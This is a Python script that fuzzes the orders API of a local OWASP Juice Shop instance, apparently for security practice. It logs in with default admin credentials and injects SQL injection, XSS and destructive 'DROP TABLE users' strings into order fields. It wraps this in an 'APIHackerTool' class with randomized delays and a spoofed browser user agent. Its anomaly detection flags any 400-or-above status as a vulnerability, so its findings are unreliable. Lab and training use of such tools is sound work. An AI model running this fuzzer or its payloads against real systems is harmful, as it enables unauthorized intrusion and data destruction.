import requests
import time
import random
import numpy as np
from sklearn.ensemble import IsolationForest

BASE_URL = "http://localhost:3000"

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Content-Type': 'application/json'
}

PROXIES = None

print("=== Juice Shop API Vuln Hunt (Corrected Endpoints) ===")

# Login
login_payload = {"email": "admin@juice-sh.op", "password": "admin123"}
login_resp = requests.post(f"{BASE_URL}/rest/user/login", json=login_payload, headers=HEADERS, proxies=PROXIES)
token = None
if login_resp.status_code == 200:
    data = login_resp.json()
    token = data.get('authentication', {}).get('token')
    print(f"Token: {bool(token)}")

if token:
    auth_headers = HEADERS.copy()
    auth_headers['Authorization'] = f"Bearer {token}"

    # Try orders without basket first
    normal_order = {
        "productId": 1,
        "quantity": 1,
        "email": "test@example.com",
        "address": "123 Fake St"
    }
    resp = requests.post(f"{BASE_URL}/api/orders", json=normal_order, headers=auth_headers, proxies=PROXIES)
    print(f"Order without basket: Status {resp.status_code}")
    if resp.status_code == 201:
        print("SUCCESS: Orders work without basket!")
        basket_id = "not_needed"
    else:
        print(f"Order failed: {resp.text[:200]}")
        # Try with basket = 1
        normal_order["bid"] = 1
        resp = requests.post(f"{BASE_URL}/api/orders", json=normal_order, headers=auth_headers, proxies=PROXIES)
        print(f"Order with bid=1: Status {resp.status_code}")
        if resp.status_code == 201:
            print("SUCCESS with bid=1!")
            basket_id = 1
        else:
            basket_id = None

    if basket_id:
        # Proceed to fuzz
        print("\n=== AI Fuzzing ===")
        statuses = []
        for i in range(5):
            time.sleep(random.uniform(0.5, 2))
            resp = requests.post(f"{BASE_URL}/api/orders", json=normal_order, headers=auth_headers, proxies=PROXIES)
            statuses.append(resp.status_code)
        data = np.array(statuses).reshape(-1, 1)
        model = IsolationForest(contamination=0.1, random_state=42)
        model.fit(data)
        print("Model trained.")

        anomalies = []
        for i in range(10):
            payload = normal_order.copy()
            if random.random() < 0.4:
                injections = ["' OR 1=1 --", "<script>alert('xss')</script>", "'; DROP TABLE users; --"]
                string_keys = [k for k, v in payload.items() if isinstance(v, str)]
                if string_keys:
                    key = random.choice(string_keys)
                    payload[key] = random.choice(injections)
            time.sleep(random.uniform(1, 3))
            resp = requests.post(f"{BASE_URL}/api/orders", json=payload, headers=auth_headers, proxies=PROXIES)
            feature = np.array([resp.status_code]).reshape(1, -1)
            score = model.decision_function(feature)[0]
            if score < -0.5 or resp.status_code >= 400:
                print(f"VULN! Status: {resp.status_code}")
                anomalies.append((payload, resp.status_code))
            else:
                print(f"Normal: {resp.status_code}")
        print(f"Total vulns: {len(anomalies)}")

        # Tool
        print("\n=== Tool ===")
        class APIHackerTool:
            def __init__(self, base_url, auth_headers, proxies=None):
                self.base_url = base_url
                self.session = requests.Session()
                self.session.headers.update(auth_headers)
                self.session.proxies = proxies or {}
                self.model = None

            def train_anomaly_model(self, endpoint, payload, samples=5):
                statuses = []
                for _ in range(samples):
                    time.sleep(random.uniform(0.5, 2))
                    resp = self.session.post(f"{self.base_url}/{endpoint}", json=payload)
                    statuses.append(resp.status_code)
                data = np.array(statuses).reshape(-1, 1)
                self.model = IsolationForest(contamination=0.1)
                self.model.fit(data)
                print("Tool trained.")

            def fuzz_endpoint(self, endpoint, base_payload, iterations=10):
                if not self.model:
                    return []
                anomalies = []
                for _ in range(iterations):
                    payload = self._mutate_payload(base_payload)
                    time.sleep(random.uniform(1, 3))
                    resp = self.session.post(f"{self.base_url}/{endpoint}", json=payload)
                    feature = np.array([resp.status_code]).reshape(1, -1)
                    score = self.model.decision_function(feature)[0]
                    if score < -0.5 or resp.status_code >= 400:
                        print(f"Tool Vuln: Status {resp.status_code}")
                        anomalies.append(resp)
                return anomalies

            def _mutate_payload(self, payload):
                if random.random() < 0.4 and payload:
                    injections = ["' OR 1=1 --", "<script>alert('xss')</script>", "'; DROP TABLE users; --"]
                    string_keys = [k for k, v in payload.items() if isinstance(v, str)]
                    if string_keys:
                        key = random.choice(string_keys)
                        payload = payload.copy()
                        payload[key] = random.choice(injections)
                return payload

        tool = APIHackerTool(BASE_URL, auth_headers, PROXIES)
        tool.train_anomaly_model("api/orders", normal_order)
        vulns = tool.fuzz_endpoint("api/orders", base_payload=normal_order)
        print(f"Tool vulns: {len(vulns)}")

    else:
        print("Orders not working—check Juice Shop setup.")

else:
    print("No token.")

print("\n=== Win Check ===")
if token and basket_id and anomalies:
    print("WIN!")
else:
    print("Try latest image or manual UI test.")
